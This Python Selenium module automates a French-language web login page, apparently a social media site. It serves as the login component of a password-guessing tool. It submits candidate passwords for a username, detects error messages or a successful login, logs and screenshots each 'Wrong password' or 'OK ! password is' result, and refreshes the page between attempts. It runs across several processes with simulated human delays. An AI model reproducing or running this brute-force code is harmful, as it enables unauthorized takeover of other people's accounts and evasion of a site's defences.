import random
import time

from selenium.webdriver import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementNotVisibleException

from selenium.webdriver.support.wait import WebDriverWait
from Resources.fake_reaction import fake_time_wait


class LoginPage:

    def __init__(self, driver, proc=None):
        self.correct_password = False
        self.driver = driver
        self.proc = proc

        # Login locators:
        self.username_textbox = (By.NAME, 'username')
        self.password_textbox = (By.NAME, 'password')

        # self.login_btn = (By.XPATH, "//*[text()='Se connecter']")
        self.login_btn = (By.XPATH, "//*[@id='loginForm']/div/div[3]/button")

        # Error msg locators:
        self.login_error_msg = (By.CLASS_NAME, "_ab2z")

        # Account page locators:
        self.foryou_btn = (By.CLASS_NAME, "_ab1a")

        # Cookies locators:
        self.cookie_accept_btn = (By.CSS_SELECTOR, ".\\_a9_0")
        self.cookie_reject_btn = (By.CSS_SELECTOR, ".\\_a9_1")

        #logo locator:
        self.logo = (By.CSS_SELECTOR, "[aria-label='Accueil'")

    def open_page(self, url):
        self.driver.get(url)
        # self.driver.save_screenshot('open_page.png')
        fake_time_wait(self.proc)

    # Todo:
    #   Remplacer cette méthode par une génération de cookie pré-configuré
    def is_cookies_here(self):
        try:
            WebDriverWait(self.driver, 1).until(EC.visibility_of_element_located(self.cookie_accept_btn))
            print(f'Process n°{self.proc} - Cookies page detected, rejecting...')
            # self.driver.save_screenshot('cookies_detected.png')
        except TimeoutException:
            print(f'Process n°{self.proc} - Cookies page not detected. Continue')
            # self.driver.save_screenshot('cookies_not_detect.png')
        else:
            self.driver.find_element(*self.cookie_reject_btn).click()
            WebDriverWait(self.driver, 5).until_not(EC.visibility_of_element_located(self.cookie_accept_btn))
            print(f'Process n°{self.proc} - Cookies page disappeared, continue')
            # self.driver.save_screenshot('cookies_disappeared.png')

    def enter_username(self, username):
        self.driver.find_element(*self.username_textbox).send_keys(username)

    def enter_password(self, password):
        self.driver.find_element(*self.password_textbox).send_keys(password)

    def login_action(self, username, password):
        self.driver.find_element(*self.username_textbox).send_keys(username)
        self.driver.find_element(*self.password_textbox).send_keys(password)
        # self.driver.execute_script("return document.querySelector(\"input[name='password']\").value=\"\"")
        self.driver.find_element(*self.password_textbox).send_keys(Keys.ENTER)
        print(f'Process n°{self.proc} - Trying password {password}')

    def click_login(self):
        self.driver.find_element(*self.login_btn).click()

    def take_screen(self, name):
        self.driver.save_screenshot(f'{name}.png')

    def is_password_works(self, password, ct):

        WebDriverWait(self.driver, 5).until_not(EC.text_to_be_present_in_element_attribute(self.login_btn, 'type', 'disabled'))

        try:
            self.driver.find_element(*self.login_error_msg).is_displayed()
        except NoSuchElementException:
            print(f'Process n°{self.proc} - Error message not detected. Continue')
            try:
                self.driver.find_element(*self.logo).is_displayed()
            except NoSuchElementException:
                print(f'Process n°{self.proc} - Logged page not detected. Continue')
                print(f'Essaie({ct}) - Wrong password! [{password}]')
                self.driver.save_screenshot(f" Wrong1_{password}_{ct}.png")
                self.driver.refresh()
            else:
                print(f'Essaie({ct}) - OK ! password is : [{password}]')
                self.driver.save_screenshot(f" OK1_{password}_{ct}.png")
                time.sleep(10)
        else:
            print(f'Error msg detected')
            print(f'Essaie({ct}) - Wrong password! [{password}]')
            self.driver.save_screenshot(f" Wrong2_{password}_{ct}.png")
            # self.driver.execute_script("return document.querySelector(\"input[name='password']\").value=\"\"")
            self.driver.refresh()





        # if self.driver.find_element(*self.foryou_btn).is_displayed():
        #     print(f'Congratulations! You have successfully logged in!')
